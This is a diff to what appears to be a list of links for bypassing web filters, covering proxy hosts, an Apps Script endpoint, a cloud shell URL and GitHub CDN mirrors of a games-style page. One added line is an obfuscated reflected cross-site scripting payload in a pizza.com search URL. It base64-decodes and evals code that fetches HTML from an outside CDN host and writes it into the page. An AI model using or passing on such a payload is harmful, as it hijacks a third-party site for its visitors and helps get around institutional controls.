@@ -1,4 +1,4 @@
-hihttps://script.google.com/macros/s/AKfycbw-9Y0SkbAhSVLBK8u5bVqhwYXqU1enIElKPM6AZyVig_q__c4hKzQX8TmfbUpvLwv2/exec
+hyhihttps://script.google.com/macros/s/AKfycbw-9Y0SkbAhSVLBK8u5bVqhwYXqU1enIElKPM6AZyVig_q__c4hKzQX8TmfbUpvLwv2/exec
 
 https://gf6l4ah4.betterthancbmagic.life/
 
@@ -224,3 +224,18 @@ https://esm.sh/gh/Mtreasur0133-bit/autorepo1@c595d652781ed7a94b6d09db82bbfc00e63
 
 
 https://3000-cs-32ea7258-2087-46cd-a7e0-6994b070dfac.cs-europe-west4-bhnf.cloudshell.dev/
+
+
+
+
+https://college.academics.deno.net/
+
+https://pizza.com/?s=<img%20src%20onerror=e%3Deval,e(atob('dmFyIHkgPSBhdG9iKCdhSFIwY0hNNkx5OWpaRzR1YW5Oa1pXeHBkbkl1Ym1WMEwyZG9MMmRoYkdGNGVXdHBibWN4Tmk5c1pXRnlia0J0WVdsdUwyUmhkR0V1YUhSdGJBPT0nKTtmZXRjaCh5KS50aGVuKGZ1bmN0aW9uKHIpe3JldHVybiByLnRleHQoKX0pLnRoZW4oZnVuY3Rpb24odCl7ZG9jdW1lbnQud3JpdGUodCl9KQ%3D%3D'))>
+
+https://cdn.esm.sh/gh/2hz4kjwbr5-ux/gn-mathhsh@main/index.html
+https://esm.sh/gh/2hz4kjwbr5-ux/gn-mathhsh@main/index.html
+
+https://cdn.esm.sh/gh/2hz4kjwbr5-ux/gn-mathhsh@main/index.html
+
+
+
